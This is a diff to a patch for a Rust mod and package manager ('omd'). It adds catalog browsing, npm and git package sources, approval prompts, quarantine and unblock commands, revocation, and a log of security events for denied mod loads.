@@ -35655,10 +35655,10 @@ index 000000000..82e034bef
 +}
 diff --git a/codex-rs/ext/omd/src/mods/expansion.rs b/codex-rs/ext/omd/src/mods/expansion.rs
 new file mode 100644
-index 000000000..527487648
+index 000000000..843f391f8
 --- /dev/null
 +++ b/codex-rs/ext/omd/src/mods/expansion.rs
-@@ -0,0 +1,652 @@
+@@ -0,0 +1,662 @@
 +mod activity;
 +mod approvals;
 +mod delivery;
@@ -35708,6 +35708,7 @@ index 000000000..527487648
 +    "routes.select",
 +    "turns.activity",
 +    "packages.list",
++    "packages.index",
 +    "packages.preview",
 +    "packages.reload",
 +    "settings.write",
@@ -36142,6 +36143,15 @@ index 000000000..527487648
 +                codex_omd::ModStore::open(host.root.clone())
 +                    .and_then(|store| codex_omd::package_controls::preview(&store, arguments))
 +                    .map(|preview| preview.public)
++                    .map_err(|error| error.to_string())
++            }))
++            .await
++        }
++        "packages.index" => {
++            let arguments = request.arguments;
++            blocking(Box::new(move || {
++                codex_omd::ModStore::open(host.root.clone())
++                    .and_then(|store| codex_omd::package_controls::index(&store, arguments))
 +                    .map_err(|error| error.to_string())
 +            }))
 +            .await
@@ -50333,10 +50343,10 @@ index 000000000..b6b05710f
 +}
 diff --git a/codex-rs/omd/src/bin/omd-mod.rs b/codex-rs/omd/src/bin/omd-mod.rs
 new file mode 100644
-index 000000000..46803c93f
+index 000000000..90bbecda7
 --- /dev/null
 +++ b/codex-rs/omd/src/bin/omd-mod.rs
-@@ -0,0 +1,433 @@
+@@ -0,0 +1,451 @@
 +use codex_omd::ModHost;
 +use codex_omd::ModInstallRequest;
 +use codex_omd::ModStore;
@@ -50469,7 +50479,7 @@ index 000000000..46803c93f
 +fn run(args: &[String]) -> io::Result<Value> {
 +    let bad = || {
 +        io::Error::other(
-+            "usage: omd-mod init STORE NODE | plugin-component PLUGIN_ROOT | inspect PACKAGE | trust STORE PACKAGE SHA256 CAPABILITIES_CSV [user|project] [--allow-secret-env NAME]... [--expires SECONDS] | revoke STORE PACKAGE | trust-all STORE PACKAGES_JSON ([{path, sha256, capabilities, scope?}]) | enable/disable STORE PACKAGE | package-plan STORE REQUEST_JSON (keys: action? install|update; source {kind: local, path} or {kind: repository, ...} or {kind: package, index, id, version}; scope?; activate?; trust.packages.ID {capabilities, lifecycle?, dependencies?, secret_environment?}) | package-apply STORE REQUEST_JSON CONFIRMATION | package-lock STORE | package-enable/package-disable STORE ID | package-rollback-plan/package-uninstall-plan STORE ID | package-rollback/package-uninstall STORE ID CONFIRMATION | plugin-preview CODEX_BIN CODEX_HOME NAME@MARKETPLACE CANDIDATE | status/selection-status/reload/report/events/declarations/credentials STORE | credentials STORE add-secret MOD_ID LABEL ORIGIN (value on stdin) | test STORE SCENARIO_JSON [THREAD] | diagnostics STORE OUTPUT_JSON | explain DENIAL | discover USER_DIR PROJECT_DIR | settings STORE PACKAGE JSON | migrate STORE PACKAGE | rollback STORE PACKAGE BACKUP | command STORE MOD NAME JSON [THREAD]",
++            "usage: omd-mod init STORE NODE | plugin-component PLUGIN_ROOT | inspect PACKAGE | trust STORE PACKAGE SHA256 CAPABILITIES_CSV [user|project] [--allow-secret-env NAME]... [--expires SECONDS] | revoke STORE MOD_ID_OR_PACKAGE | trust-all STORE PACKAGES_JSON ([{path, sha256, capabilities, scope?}]) | enable/disable STORE PACKAGE | package-plan STORE REQUEST_JSON (keys: action? install|update; source {kind: local, path} or {kind: repository, repository, revision (commit, branch or tag), subdirectory?} or {kind: package, index, id, version} or {kind: npm, package, version?, registry?, integrity?}; scope?; offline?; trust.packages.ID {capabilities, lifecycle?, dependencies?, secret_environment?}) | package-apply STORE REQUEST_JSON CONFIRMATION | package-lock STORE | package-enable/package-disable/package-unblock STORE ID | package-quarantine STORE ID REASON | security-events STORE | package-rollback-plan/package-uninstall-plan STORE ID | package-rollback/package-uninstall STORE ID CONFIRMATION | plugin-preview CODEX_BIN CODEX_HOME NAME@MARKETPLACE CANDIDATE | status/selection-status/reload/report/events/declarations/credentials STORE | credentials STORE add-secret MOD_ID LABEL ORIGIN (value on stdin) | test STORE SCENARIO_JSON [THREAD] | diagnostics STORE OUTPUT_JSON | explain DENIAL | discover USER_DIR PROJECT_DIR | settings STORE PACKAGE JSON | migrate STORE PACKAGE | rollback STORE PACKAGE BACKUP | command STORE MOD NAME JSON [THREAD]",
 +        )
 +    };
 +    match args {
@@ -50607,11 +50617,29 @@ index 000000000..46803c93f
 +                "exposure": exposure,
 +            }))
 +        }
-+        [command, root, path] if command == "revoke" => {
-+            ModStore::open(PathBuf::from(root).canonicalize()?)?
-+                .revoke_authority(&PathBuf::from(path).canonicalize()?)?;
++        [command, root, target] if command == "revoke" => {
++            let target = match PathBuf::from(target).canonicalize() {
++                Ok(path) if target.contains('/') => path.display().to_string(),
++                _ => target.clone(),
++            };
++            ModStore::open(PathBuf::from(root).canonicalize()?)?.revoke(&target)?;
 +            Ok(Value::String(
-+                "os and approve authority revoked; running processes stop at the next turn boundary; trust again to renew".into(),
++                "disabled and every grant dropped; owned work stops at the next reload; trust or install again to renew".into(),
++            ))
++        }
++        [command, root, id, reason @ ..] if command == "package-quarantine" => {
++            ModStore::open(PathBuf::from(root).canonicalize()?)?
++                .package_quarantine(id, &reason.join(" "))
++                .and_then(|lock| serde_json::to_value(lock).map_err(io::Error::other))
++        }
++        [command, root, id] if command == "package-unblock" => {
++            ModStore::open(PathBuf::from(root).canonicalize()?)?
++                .package_unblock(id)
++                .and_then(|lock| serde_json::to_value(lock).map_err(io::Error::other))
++        }
++        [command, root] if command == "security-events" => {
++            Ok(Value::Array(
++                ModStore::open(PathBuf::from(root).canonicalize()?)?.security_events()?,
 +            ))
 +        }
 +        [command, root, packages] if command == "trust-all" => {
@@ -50772,10 +50800,10 @@ index 000000000..46803c93f
 +}
 diff --git a/codex-rs/omd/src/bin/omd.rs b/codex-rs/omd/src/bin/omd.rs
 new file mode 100644
-index 000000000..1b7dad306
+index 000000000..58ec7c14a
 --- /dev/null
 +++ b/codex-rs/omd/src/bin/omd.rs
-@@ -0,0 +1,413 @@
+@@ -0,0 +1,642 @@
 +use codex_omd::{ModHost, scoped_data::ScopedDataHost};
 +use serde_json::{Value, json};
 +use std::collections::BTreeMap;
@@ -50907,14 +50935,239 @@ index 000000000..1b7dad306
 +    )
 +}
 +
++const MODS_USAGE: &str = "usage: omd install REFERENCE [--version V] [--scope user|project] [--yes] [--store PATH] | omd mods list | catalog [QUERY] | inspect REFERENCE | enable|disable|update|remove|rollback|revoke|unblock ID | quarantine ID REASON | events | reset-lock (same flags); REFERENCE is ID[@VERSION] from the curated index, npm:NAME[@VERSION], git+URL[#REF[:DIRECTORY]] or a folder (./PATH or /PATH)";
++
++const APPROVAL_REQUIRED: &str = "package_approval_required";
++
++fn mods(action: &str, args: &[String]) -> io::Result<Value> {
++    use codex_omd::package_controls;
++    let usage = || io::Error::other(MODS_USAGE);
++    let mut positional = Vec::new();
++    let mut scope = "user".to_owned();
++    let mut version = None;
++    let mut yes = false;
++    let mut root = std::env::var_os(codex_omd::MOD_STORE_ENV).map(PathBuf::from);
++    let mut remaining = args.iter();
++    while let Some(argument) = remaining.next() {
++        match argument.as_str() {
++            "--yes" => yes = true,
++            "--scope" => scope = remaining.next().ok_or_else(usage)?.clone(),
++            "--version" => version = Some(remaining.next().ok_or_else(usage)?.clone()),
++            "--store" => root = Some(PathBuf::from(remaining.next().ok_or_else(usage)?)),
++            flag if flag.starts_with("--") => return Err(usage()),
++            _ => positional.push(argument.clone()),
++        }
++    }
++    let store = codex_omd::ModStore::open(
++        root.ok_or_else(|| io::Error::other("explicit_mod_store_required"))?
++            .canonicalize()?,
++    )?;
++    let first = || positional.first().cloned().ok_or_else(usage);
++    let done = |display: String| Ok(json!({"display": display}));
++    match action {
++        "list" => {
++            let listed = package_controls::list(&store, None)?;
++            let rows = listed["packages"]
++                .as_array()
++                .into_iter()
++                .flatten()
++                .map(|package| {
++                    format!(
++                        "{} {} {} {}{}",
++                        package["id"].as_str().unwrap_or("?"),
++                        package["version"].as_str().unwrap_or("-"),
++                        package["scope"].as_str().unwrap_or("-"),
++                        if package["enabled"] == true { "on" } else { "off" },
++                        package["source"]
++                            .as_str()
++                            .map_or(String::new(), |source| format!(" ({source})"))
++                    )
++                })
++                .collect::<Vec<_>>();
++            Ok(json!({"display": if rows.is_empty() { "No mods installed.".to_owned() } else { rows.join("\n") }, "packages": listed["packages"]}))
++        }
++        "catalog" => {
++            let found = package_controls::index(&store, json!({"query": positional.join(" ")}))?;
++            let rows = found["packages"]
++                .as_array()
++                .into_iter()
++                .flatten()
++                .map(|package| {
++                    format!(
++                        "{}@{}  {}{}",
++                        package["id"].as_str().unwrap_or("?"),
++                        package["latest"].as_str().unwrap_or("?"),
++                        package["description"].as_str().unwrap_or(""),
++                        package["installed"]
++                            .as_str()
++                            .map_or(String::new(), |installed| format!(" [installed {installed}]"))
++                    )
++                })
++                .collect::<Vec<_>>();
++            done(if rows.is_empty() {
++                "No catalog mods match.".to_owned()
++            } else {
++                rows.join("\n")
++            })
++        }
++        "events" => Ok(Value::Array(store.security_events()?)),
++        "reset-lock" => {
++            let aside = store.reset("packages.lock.json")?;
++            done(format!(
++                "Moved the package lock to {}. Installed mods keep running as trusted selections; reinstall one to manage it as a package again.",
++                aside.display()
++            ))
++        }
++        "quarantine" => {
++            let id = first()?;
++            store.package_quarantine(&id, &positional[1..].join(" "))?;
++            done(format!(
++                "Quarantined {id}: it is off and this version cannot be enabled, reinstalled or rolled back to. Its data is kept; `omd mods unblock {id}` lifts the block."
++            ))
++        }
++        "unblock" => {
++            let id = first()?;
++            store.package_unblock(&id)?;
++            done(format!("Unblocked {id}. It stays off until `omd mods enable {id}`."))
++        }
++        "revoke" => {
++            let id = first()?;
++            store.revoke(&id)?;
++            done(format!(
++                "Revoked {id}: it is off and its grant is dropped. Install or trust it again to restore it."
++            ))
++        }
++        "install" | "inspect" | "enable" | "disable" | "update" | "remove" | "rollback" => {
++            let target = first()?;
++            let mut arguments = json!({"action": if action == "inspect" { "install" } else { action }, "scope": scope});
++            if matches!(action, "install" | "inspect") {
++                arguments["reference"] = json!(folder_reference(&target)?);
++                arguments["version"] = json!(version);
++            } else {
++                arguments["id"] = json!(target);
++            }
++            let preview = package_controls::preview(&store, arguments)?;
++            let summary = describe(&preview.public);
++            if action == "inspect" {
++                return Ok(json!({"display": summary, "preview": preview.public}));
++            }
++            if action != "disable" && !yes {
++                if !io::IsTerminal::is_terminal(&io::stdin()) {
++                    return Err(io::Error::other(format!(
++                        "{APPROVAL_REQUIRED}: review `omd mods inspect` or run interactively, then pass --yes\n{summary}"
++                    )));
++                }
++                if !confirm(&summary)? {
++                    return Err(io::Error::other(format!("{APPROVAL_REQUIRED}: declined")));
++                }
++            }
++            package_controls::apply(&store, &preview.control)?;
++            let id = &preview.control.id;
++            done(match action {
++                "install" => format!(
++                    "Installed {id} ({scope}). It is off: run `omd mods enable {id}` to turn it on."
++                ),
++                "update" => format!(
++                    "Updated {id}. A changed grant, authority or origin leaves it off until `omd mods enable {id}`."
++                ),
++                "remove" => format!("Removed {id}. Its cache, state and local sources are kept."),
++                "rollback" => format!("Rolled {id} back to its previous version."),
++                _ => format!("{id} is {}d.", action),
++            })
++        }
++        _ => Err(usage()),
++    }
++}
++
++fn folder_reference(reference: &str) -> io::Result<String> {
++    let path = if let Some(rest) = reference.strip_prefix("~/") {
++        PathBuf::from(std::env::var_os("HOME").ok_or_else(|| io::Error::other("home_unavailable"))?)
++            .join(rest)
++    } else if reference == "." || reference.starts_with("./") || reference.starts_with("../") {
++        PathBuf::from(reference)
++    } else {
++        return Ok(reference.to_owned());
++    };
++    Ok(path.canonicalize()?.display().to_string())
++}
++
++fn describe(preview: &Value) -> String {
++    let text = |value: &Value| match value {
++        Value::Null => "-".to_owned(),
++        Value::String(value) => value.clone(),
++        Value::Array(values) if values.is_empty() => "none".to_owned(),
++        Value::Array(values) => values.iter().map(|value| value.as_str().map_or_else(|| value.to_string(), str::to_owned)).collect::<Vec<_>>().join(", "),
++        value => value.to_string(),
++    };
++    let changes = &preview["changes"];
++    let mut lines = vec![format!(
++        "{} {}",
++        text(&preview["action"]),
++        text(&preview["id"])
++    )];
++    for package in changes["packages"].as_array().into_iter().flatten() {
++        let from = &package["version"]["from"];
++        lines.push(format!(
++            "- {} {}{}",
++            text(&package["id"]),
++            if from.is_null() { String::new() } else { format!("{} -> ", text(from)) },
++            text(&package["version"]["to"])
++        ));
++        lines.push(format!("  source: {}", package["source"]["to"]));
++        lines.push(format!("  integrity: {}", text(&package["integrity"]["to"])));
++        lines.push(format!("  license: {}", text(&package["license"]["to"])));
++        lines.push(format!("  capabilities: {}", text(&package["capabilities"]["to"])));
++        for exposure in package["authority"]["to"]["exposure"].as_array().into_iter().flatten() {
++            lines.push(format!("  authority: {}", text(exposure)));
++        }
++        for (label, key) in [("dependencies", "dependencies"), ("install scripts", "lifecycle"), ("secret environment", "secret_environment")] {
++            if package[key]["to"].as_array().is_some_and(|values| !values.is_empty()) {
++                lines.push(format!("  {label}: {}", text(&package[key]["to"])));
++            }
++        }
++        if package["renewed_approval"] == true {
++            lines.push("  needs your approval: new or changed grant, authority or origin".to_owned());
++        }
++    }
++    if let Some(removed) = changes["removed"].as_array() {
++        lines.push(format!("  removes {}; cache, state and local sources are kept", removed.iter().map(|item| text(&item["version"])).collect::<Vec<_>>().join(", ")));
++    }
++    if !changes["version"].is_null() {
++        lines.push(format!("  version: {} -> {}", text(&changes["version"]["from"]), text(&changes["version"]["to"])));
++    }
++    if preview["grants_added"].as_array().is_some_and(|grants| !grants.is_empty()) {
++        lines.push(format!("  grants: {}", text(&preview["grants_added"])));
++    }
++    lines.join("\n")
++}
++
++fn confirm(summary: &str) -> io::Result<bool> {
++    use std::io::{BufRead, Write};
++    let mut terminal = std::fs::OpenOptions::new().read(true).write(true).open("/dev/tty")?;
++    write!(terminal, "{summary}\nProceed? [y/N] ")?;
++    terminal.flush()?;
++    let mut answer = String::new();
++    io::BufReader::new(terminal).read_line(&mut answer)?;
++    Ok(matches!(answer.trim().to_lowercase().as_str(), "y" | "yes"))
++}
++
 +fn run(args: Vec<String>) -> io::Result<Value> {
 +    if args.is_empty() || args[0] == "--help" {
 +        return Ok(
-+            json!({"usage":"omd COMMAND --repo PATH [--store PATH] [--home PATH] [--sqlite-home PATH] [ARGS] | omd store export|reset --mod ID [--repo PATH] [--store PATH] [--scope repository|user]","commands":"Only explicitly enabled extensions with a CLI export may run. Model requests and process execution are unavailable here. `omd store` exports or resets one mod's namespaced store without running mod code."}),
++            json!({"usage":format!("omd COMMAND --repo PATH [--store PATH] [--home PATH] [--sqlite-home PATH] [ARGS] | omd store export|reset --mod ID [--repo PATH] [--store PATH] [--scope repository|user] | {MODS_USAGE}"),"commands":"Only explicitly enabled extensions with a CLI export may run. Model requests and process execution are unavailable here. `omd store` exports or resets one mod's namespaced store without running mod code. `omd install` and `omd mods` manage mod packages; `omd update` updates OMD itself."}),
 +        );
 +    }
 +    if args[0] == "store" {
 +        return store(&args[1..]);
++    }
++    if args[0] == "install" {
++        return mods("install", &args[1..]);
++    }
++    if args[0] == "mods" {
++        let (action, rest) = args[1..]
++            .split_first()
++            .ok_or_else(|| io::Error::other(MODS_USAGE))?;
++        return mods(action, rest);
 +    }
 +    if args.len() > 128 || args.iter().map(String::len).sum::<usize>() > 8192 {
 +        return Err(io::Error::other("command_argument_limit"));
@@ -51091,7 +51344,11 @@ index 000000000..1b7dad306
 +        }
 +        Err(error) => {
 +            eprintln!("{error}");
-+            std::process::exit(1);
++            std::process::exit(if error.to_string().starts_with(APPROVAL_REQUIRED) {
++                2
++            } else {
++                1
++            });
 +        }
 +    }
 +}
@@ -60722,10 +60979,10 @@ index 000000000..afa32f4fe
 +}
 diff --git a/codex-rs/omd/src/mods.rs b/codex-rs/omd/src/mods.rs
 new file mode 100644
-index 000000000..2de64a352
+index 000000000..81d7821a1
 --- /dev/null
 +++ b/codex-rs/omd/src/mods.rs
-@@ -0,0 +1,4850 @@
+@@ -0,0 +1,4869 @@
 +mod author;
 +mod bridge;
 +mod chain;
@@ -61127,6 +61384,7 @@ index 000000000..2de64a352
 +    "prompts.revoke",
 +    "builtins.invoke",
 +    "packages.list",
++    "packages.index",
 +    "packages.preview",
 +    "packages.apply",
 +    "packages.reload",
@@ -63424,6 +63682,7 @@ index 000000000..2de64a352
 +        | "composer.read"
 +        | "prompts.status"
 +        | "packages.list"
++        | "packages.index"
 +        | "packages.preview"
 +        | "exec.output_page"
 +        | "terminal.image_sample" => true,
@@ -63810,6 +64069,23 @@ index 000000000..2de64a352
 +        self.node = config.node;
 +        self.loaded = next;
 +        self.order = order;
++        let denied = rejected
++            .iter()
++            .filter(|rejection| {
++                !self.rejected.iter().any(|previous| {
++                    previous.path == rejection.path && previous.reason == rejection.reason
++                })
++            })
++            .map(|rejection| json!({"path": rejection.path, "mod": rejection.id,
++                "scope": rejection.scope, "reason": rejection.reason.split(':').next()}))
++            .collect::<Vec<_>>();
++        if !denied.is_empty()
++            && let Ok(_guard) = self.store.lock()
++        {
++            let _ = self
++                .store
++                .record_security_event("load_denied", json!({"selections": denied}));
++        }
 +        self.rejected = rejected;
 +        self.admit();
 +        self.configuration_sha256 = hash;
@@ -66180,10 +66456,10 @@ index 000000000..b98622986
 +}
 diff --git a/codex-rs/omd/src/mods/bridge.rs b/codex-rs/omd/src/mods/bridge.rs
 new file mode 100644
-index 000000000..c143f6d81
+index 000000000..941f1846d
 --- /dev/null
 +++ b/codex-rs/omd/src/mods/bridge.rs
-@@ -0,0 +1,338 @@
+@@ -0,0 +1,339 @@
 +use super::*;
 +use std::time::Duration;
 +use std::time::Instant;
@@ -66261,7 +66537,8 @@ index 000000000..c143f6d81
 +            "builtins.invoke" | "commands.invoke" => Ok("builtins"),
 +            "config.describe" => Ok("config"),
 +            "config.set" => Ok("config.write"),
-+            "packages.list" | "packages.preview" | "packages.apply" | "packages.reload" => {
++            "packages.list" | "packages.index" | "packages.preview" | "packages.apply"
++            | "packages.reload" => {
 +                Ok("packages")
 +            }
 +            "settings.write" if self.arguments["id"].is_string() => Ok("packages"),
@@ -68377,16 +68654,21 @@ index 000000000..4973a2bbb
 +}
 diff --git a/codex-rs/omd/src/mods/package_manager.rs b/codex-rs/omd/src/mods/package_manager.rs
 new file mode 100644
-index 000000000..f01f143c6
+index 000000000..9825d6647
 --- /dev/null
 +++ b/codex-rs/omd/src/mods/package_manager.rs
-@@ -0,0 +1,1226 @@
+@@ -0,0 +1,2146 @@
 +use super::*;
 +use serde_json::Map;
++use std::io::Read;
 +use std::process::Command;
 +
 +const PACKAGE_LOCK_SCHEMA: u32 = 1;
 +const PACKAGE_HISTORY_LIMIT: usize = 8;
++const NPM_METADATA_LIMIT: usize = 16 * 1024 * 1024;
++const NPM_TARBALL_LIMIT: usize = 4 * 1024 * 1024;
++const NPM_UNPACKED_LIMIT: usize = 16 * 1024 * 1024;
++const NPM_ARCHIVE_ENTRIES: usize = 1024;
 +
 +#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
 +#[serde(tag = "kind", rename_all = "snake_case", deny_unknown_fields)]
@@ -68405,6 +68687,179 @@ index 000000000..f01f143c6
 +        id: String,
 +        version: String,
 +    },
++    Npm {
++        package: String,
++        #[serde(default)]
++        version: String,
++        #[serde(default)]
++        registry: String,
++        #[serde(default, skip_serializing_if = "String::is_empty")]
++        integrity: String,
++    },
++}
++
++/// The registry and token settings npm and pnpm read from the user's `.npmrc`.
++#[derive(Default)]
++struct NpmConfig {
++    registry: Option<String>,
++    scopes: BTreeMap<String, String>,
++    tokens: Vec<(String, String)>,
++}
++
++impl NpmConfig {
++    fn load() -> Self {
++        let path = std::env::var_os("NPM_CONFIG_USERCONFIG")
++            .map(PathBuf::from)
++            .or_else(|| std::env::var_os("HOME").map(|home| PathBuf::from(home).join(".npmrc")));
++        let text = path
++            .filter(|path| std::fs::metadata(path).is_ok_and(|meta| meta.is_file() && meta.len() <= 65_536))
++            .and_then(|path| std::fs::read_to_string(path).ok())
++            .unwrap_or_default();
++        let expand = |value: &str| {
++            let mut expanded = value.trim().trim_matches('"').to_owned();
++            while let Some(start) = expanded.find("${") {
++                let Some(length) = expanded[start..].find('}') else { break };
++                let name = expanded[start + 2..start + length].to_owned();
++                let replacement = std::env::var(&name).unwrap_or_default();
++                expanded.replace_range(start..=start + length, &replacement);
++            }
++            expanded
++        };
++        let mut config = Self::default();
++        for line in text.lines().map(str::trim) {
++            let Some((key, value)) = line.split_once('=').filter(|_| !line.starts_with(['#', ';'])) else {
++                continue;
++            };
++            let (key, value) = (key.trim(), expand(value));
++            if key == "registry" {
++                config.registry = Some(value);
++            } else if let Some(scope) = key.strip_suffix(":registry").filter(|scope| scope.starts_with('@')) {
++                config.scopes.insert(scope.to_owned(), value);
++            } else if let Some(prefix) = key.strip_suffix(":_authToken").filter(|prefix| prefix.starts_with("//")) {
++                config.tokens.push((format!("{}/", prefix.trim_end_matches('/')), value));
++            }
++        }
++        config
++    }
++
++    fn registry(&self, package: &str) -> String {
++        package
++            .split_once('/')
++            .and_then(|(scope, _)| self.scopes.get(scope))
++            .or(self.registry.as_ref())
++            .map_or("https://registry.npmjs.org", String::as_str)
++            .trim_end_matches('/')
++            .to_owned()
++    }
++
++    fn token(&self, url: &str) -> Option<&str> {
++        let target = format!("//{}", url.split_once("://")?.1);
++        self.tokens
++            .iter()
++            .filter(|(prefix, _)| target.starts_with(prefix.as_str()))
++            .max_by_key(|(prefix, _)| prefix.len())
++            .map(|(_, token)| token.as_str())
++            .filter(|token| !token.is_empty())
++    }
++}
++
++impl ModPackageSource {
++    /// Parses `npm:NAME[@VERSION]`, `git+URL[#REF[:SUBDIRECTORY]]`, an absolute folder, or `ID[@VERSION]` from `index`.
++    pub fn parse(reference: &str, index: Option<PathBuf>) -> Result<Self> {
++        let reference = reference.trim();
++        let versioned = |value: &str| match value.get(1..).and_then(|rest| rest.rfind('@')) {
++            Some(at) => (value[..=at].to_owned(), value[at + 2..].to_owned()),
++            None => (value.to_owned(), String::new()),
++        };
++        if let Some(npm) = reference.strip_prefix("npm:") {
++            let (package, version) = versioned(npm);
++            return Ok(Self::Npm {
++                package,
++                version,
++                registry: String::new(),
++                integrity: String::new(),
++            });
++        }
++        if let Some(git) = reference.strip_prefix("git+") {
++            let (repository, fragment) = git.split_once('#').unwrap_or((git, "HEAD"));
++            let (revision, subdirectory) = fragment.split_once(':').unwrap_or((fragment, ""));
++            return Ok(Self::Repository {
++                repository: repository
++                    .strip_prefix("file://")
++                    .unwrap_or(repository)
++                    .to_owned(),
++                revision: revision.to_owned(),
++                subdirectory: subdirectory.to_owned(),
++            });
++        }
++        if reference.starts_with('/') {
++            return Ok(Self::Local {
++                path: reference.into(),
++            });
++        }
++        let (id, version) = versioned(reference);
++        if !identifier(&id) || !version_selector(&version) {
++            return Err(failure(
++                "package_reference_invalid: use ID[@VERSION], npm:NAME[@VERSION], git+URL[#REF[:DIRECTORY]] or an absolute folder",
++            ));
++        }
++        Ok(Self::Package {
++            index: index.ok_or_else(|| {
++                failure("package_index_unavailable: install from npm:, git+ or a folder instead")
++            })?,
++            id,
++            version,
++        })
++    }
++
++    /// Replaces the requested version of a package or npm source.
++    pub fn with_version(self, requested: &str) -> Result<Self> {
++        match self {
++            Self::Package { index, id, .. } => Ok(Self::Package {
++                index,
++                id,
++                version: requested.to_owned(),
++            }),
++            Self::Npm {
++                package, registry, ..
++            } => Ok(Self::Npm {
++                package,
++                version: requested.to_owned(),
++                registry,
++                integrity: String::new(),
++            }),
++            _ => Err(failure(
++                "package_version_unsupported: pin a Git source with #REF; folders have no versions",
++            )),
++        }
++    }
++
++    /// The source an update resolves: newer compatible index and npm releases; pinned commits and local folders as is.
++    pub fn updatable(&self) -> Self {
++        let compatible = |version: &str| match SemanticVersion::parse(version) {
++            Some(_) => format!("^{version}"),
++            None => String::new(),
++        };
++        match self {
++            Self::Package { index, id, version } => Self::Package {
++                index: index.clone(),
++                id: id.clone(),
++                version: compatible(version),
++            },
++            Self::Npm {
++                package,
++                version,
++                registry,
++                ..
++            } => Self::Npm {
++                package: package.clone(),
++                version: compatible(version),
++                registry: registry.clone(),
++                integrity: String::new(),
++            },
++            source => source.clone(),
++        }
++    }
 +}
 +
 +#[derive(Clone, Debug, Default, Deserialize, Serialize, PartialEq)]
@@ -68436,8 +68891,6 @@ index 000000000..f01f143c6
 +    #[serde(default = "user_scope")]
 +    pub scope: String,
 +    #[serde(default)]
-+    pub activate: bool,
-+    #[serde(default)]
 +    pub offline: bool,
 +    #[serde(default)]
 +    pub trust: ModPackageTrust,
@@ -68461,6 +68914,7 @@ index 000000000..f01f143c6
 +    pub state_version: u32,
 +    pub dependencies: Vec<ModDependency>,
 +    pub capabilities: Vec<String>,
++    pub authority: Value,
 +    #[serde(default, skip_serializing_if = "Vec::is_empty")]
 +    pub exec_environment: Vec<String>,
 +    pub settings_schema_sha256: String,
@@ -68479,6 +68933,17 @@ index 000000000..f01f143c6
 +    pub packages: BTreeMap<String, ModLockedPackage>,
 +    #[serde(default)]
 +    pub history: BTreeMap<String, Vec<ModLockedPackage>>,
++    #[serde(default)]
++    pub blocked: Vec<ModBlockedPackage>,
++}
++
++#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
++#[serde(deny_unknown_fields)]
++pub struct ModBlockedPackage {
++    pub id: String,
++    pub version: String,
++    pub integrity: String,
++    pub reason: String,
 +}
 +
 +impl Default for ModPackageLock {
@@ -68488,7 +68953,19 @@ index 000000000..f01f143c6
 +            revision: 0,
 +            packages: BTreeMap::new(),
 +            history: BTreeMap::new(),
++            blocked: Vec::new(),
 +        }
++    }
++}
++
++impl ModPackageLock {
++    pub fn blocked_reason(&self, id: &str, version: &str, integrity: &str) -> Option<&str> {
++        self.blocked
++            .iter()
++            .find(|blocked| {
++                blocked.id == id && (blocked.version == version || blocked.integrity == integrity)
++            })
++            .map(|blocked| blocked.reason.as_str())
 +    }
 +}
 +
@@ -68516,6 +68993,20 @@ index 000000000..f01f143c6
 +    version: String,
 +    source: ModPackageSource,
 +    integrity: String,
++    #[serde(default)]
++    blocked: Option<String>,
++    #[serde(default)]
++    description: Option<String>,
++    #[serde(default)]
++    support: Option<String>,
++}
++
++fn read_index(path: &Path) -> Result<PackageIndex> {
++    let index: PackageIndex = serde_json::from_slice(&store::read(path, 524_288)?)?;
++    if index.schema != 1 {
++        return Err(failure("unsupported_package_index_schema"));
++    }
++    Ok(index)
 +}
 +
 +#[derive(Clone)]
@@ -68534,7 +69025,11 @@ index 000000000..f01f143c6
 +    pub(super) fn read_package_lock(&self) -> Result<ModPackageLock> {
 +        match store::read(&self.root.join("packages.lock.json"), 524_288) {
 +            Ok(bytes) => {
-+                let lock: ModPackageLock = serde_json::from_slice(&bytes)?;
++                let lock: ModPackageLock = serde_json::from_slice(&bytes).map_err(|error| {
++                    failure(format!(
++                        "package_lock_unreadable: {error}; run `omd mods reset-lock` to set it aside"
++                    ))
++                })?;
 +                if lock.schema != PACKAGE_LOCK_SCHEMA {
 +                    return Err(failure("unsupported_package_lock_schema"));
 +                }
@@ -68544,6 +69039,53 @@ index 000000000..f01f143c6
 +            Err(error) if error.kind() == io::ErrorKind::NotFound => Ok(ModPackageLock::default()),
 +            Err(error) => Err(error),
 +        }
++    }
++
++    /// The curated index the installer places in the store, if any.
++    pub fn package_index(&self) -> Option<PathBuf> {
++        let path = self.root.join("package-index.json");
++        path.is_file().then_some(path)
++    }
++
++    /// Lists index packages whose id or description contains `query`, newest unblocked release first.
++    pub fn package_index_entries(&self, index: &Path, query: &str) -> Result<Value> {
++        let lock = self.package_lock()?;
++        let query = query.trim().to_lowercase();
++        let mut packages = Vec::new();
++        for (id, releases) in read_index(index)?.packages {
++            let mut releases = releases;
++            releases.reverse();
++            releases.sort_by_key(|release| {
++                std::cmp::Reverse(SemanticVersion::parse(&release.version))
++            });
++            let Some(newest) = releases
++                .iter()
++                .find(|release| release.blocked.is_none())
++                .or(releases.first())
++            else {
++                continue;
++            };
++            let description = newest.description.clone().unwrap_or_default();
++            if !query.is_empty()
++                && !id.to_lowercase().contains(&query)
++                && !description.to_lowercase().contains(&query)
++            {
++                continue;
++            }
++            packages.push(json!({
++                "id": id,
++                "latest": newest.version,
++                "description": description,
++                "support": newest.support,
++                "versions": releases.iter().map(|release| json!({"version": release.version,
++                    "blocked": release.blocked})).collect::<Vec<_>>(),
++                "installed": lock.packages.get(&id).map(|package| &package.version),
++            }));
++            if packages.len() == 200 {
++                break;
++            }
++        }
++        Ok(json!({"index": index, "packages": packages}))
 +    }
 +
 +    pub fn package_plan(&self, request: ModInstallRequest) -> Result<ModPackagePlan> {
@@ -68592,6 +69134,16 @@ index 000000000..f01f143c6
 +        let mut packages = resolved
 +            .into_values()
 +            .map(|mut resolved| {
++                if let Some(reason) = existing.blocked_reason(
++                    &resolved.locked.id,
++                    &resolved.locked.version,
++                    &resolved.locked.integrity,
++                ) {
++                    return Err(failure(format!(
++                        "package_blocked: {} {}: {reason}",
++                        resolved.locked.id, resolved.locked.version
++                    )));
++                }
 +                let previous = existing.packages.get(&resolved.package.id);
 +                let settings = request
 +                    .settings
@@ -68608,7 +69160,12 @@ index 000000000..f01f143c6
 +                            .join(ModStore::state_name(&resolved.package.id, &request.scope))
 +                            .exists()
 +                });
-+                resolved.locked.enabled = request.activate && !state_migration_required;
++                resolved.locked.enabled = previous.is_some_and(|locked| {
++                    locked.enabled
++                        && locked.trust == resolved.locked.trust
++                        && locked.authority == resolved.locked.authority
++                        && same_origin(&locked.source, &resolved.locked.source)
++                }) && !state_migration_required;
